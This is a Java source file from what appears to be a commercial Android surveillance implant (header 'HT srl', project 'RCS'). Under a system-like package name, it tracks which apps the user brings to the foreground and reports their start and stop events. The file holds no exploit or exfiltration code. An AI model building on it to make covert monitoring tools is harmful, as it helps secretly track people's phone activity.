/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.listener;

import java.util.ArrayList;
import java.util.TreeMap;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.networking.ProcessInfo;
import com.android.networking.ProcessStatus;
import com.android.networking.RunningProcesses;
import com.android.networking.Standby;
import com.android.networking.auto.Cfg;
import com.android.networking.interfaces.Observer;
import com.android.networking.util.Check;

public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$

	private BroadcastMonitorProcess processReceiver;
	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();

	private boolean started;

	/** The singleton. */
	private volatile static ListenerProcess singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}
		return singleton;
	}

	public ListenerProcess() {
		super();
		ListenerStandby.self().attach(this);
		suspended = !ListenerStandby.isScreenOn();
	}

	@Override
	protected void start() {

		if (!started && ListenerStandby.isScreenOn()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start)");
			}
			started = true;

			processReceiver = new BroadcastMonitorProcess();
			processReceiver.start();
			processReceiver.register(this);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start): already started");
			}
		}

	}

	@Override
	protected void stop() {

		if (started) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stop)");
			}
			started = false;
			if (processReceiver != null) {
				processReceiver.unregister();
				processReceiver = null;
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stop): already stopped");
			}
		}

	}

	protected int dispatch(RunningProcesses processes) {

		final ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
		if (list == null) {
			return 0;
		}
		currentRunning.clear();

		for (final Object element : list) {
			final RunningAppProcessInfo running = (RunningAppProcessInfo) element;
			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {

				currentRunning.put(running.processName, running);
				if (!lastRunning.containsKey(running.processName)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification): started " + running.processName);//$NON-NLS-1$
					}
					dispatch(new ProcessInfo(running, ProcessStatus.START));
				} else {
					lastRunning.remove(running.processName);
				}
			}
		}

		for (final Object element : lastRunning.keySet()) {
			final RunningAppProcessInfo norun = lastRunning.get(element);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): stopped " + norun.processName);//$NON-NLS-1$
			}
			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));

		}

		lastRunning = (TreeMap<String, RunningAppProcessInfo>) currentRunning.clone();

		return 0;
	}

	@Override
	public int notification(Standby b) {
		if (b.getStatus()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): try to resume");
			}
			resume();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): try to suspend");
			}
			suspend();
		}

		return 0;
	}

}
